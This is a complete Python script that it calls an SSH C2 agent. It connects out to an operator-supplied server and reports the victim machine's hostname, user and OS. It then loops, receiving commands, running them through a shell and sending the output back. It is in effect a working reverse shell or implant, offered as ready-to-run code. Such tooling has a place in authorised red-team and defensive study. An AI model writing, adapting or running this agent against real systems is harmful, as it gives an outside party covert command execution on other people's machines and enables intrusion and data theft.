import paramiko
import subprocess
import sys
import os
import socket
import getpass
import argparse

parser = argparse.ArgumentParser(description="SSH C2 agent configuration to communicate with server")
parser._action_groups.pop()
required = parser.add_argument_group("Required")
optional = parser.add_argument_group("Optional")
required.add_argument("-ip", dest="ip", help="Server IP")
optional.add_argument("-p", dest="port", type=int, default=2222, help="Server port (Default: 2222)")
optional.add_argument("-u", dest="user", default="sshUser", help="User to authenticate (Default: sshUser)")
optional.add_argument("-pwd", dest="password", default="sshPass", help="Password to authenticate (Default: sshPass)")

if (len(sys.argv) == 1):
    parser.print_help(sys.stdout)
    sys.exit()

args = parser.parse_args()

def SSH_comm():
    ip = args.ip #Server IP
    port = args.port #Server port
    username = args.user #Server username
    password = args.password #Server password

    try:
        SSH = paramiko.SSHClient()
        SSH.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        SSH.connect(ip, port=port, username=username, password=password)
        session = SSH.get_transport().open_session()
        host = socket.gethostname()
        user = getpass.getuser()
        type = os.name
    except Exception as ex:
        print("[!] Unable to connect to server.")
        sys.exit()

    if session.active:
        session.sendall(f"{host},{user},{type}")
        print(session.recv(1024).decode())
        while True:
            try:
                command = session.recv(1024).decode()
                head = command.split(" ")[0]
                match head:
                    case "!exit":
                        sys.exit()
                    case "cd":
                        path = " ".join(command.split(" ")[1:])
                        os.chdir(path)
                        CWD = os.getcwd()
                        session.sendall(f"Changed directory to {CWD}\n")
                    case _:
                        #print(command.split(" ")[1:])
                        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
                        if (len(output) == 0):
                            session.sendall("[*] Command executed. No shell output.\n")
                        else:
                            session.sendall(output)
            except Exception as ex:
                session.sendall("[!] " + str(ex) + "\n")
    return

if __name__ == "__main__":
    try:
        SSH_comm()
    except Exception as ex:
        print(str(ex))
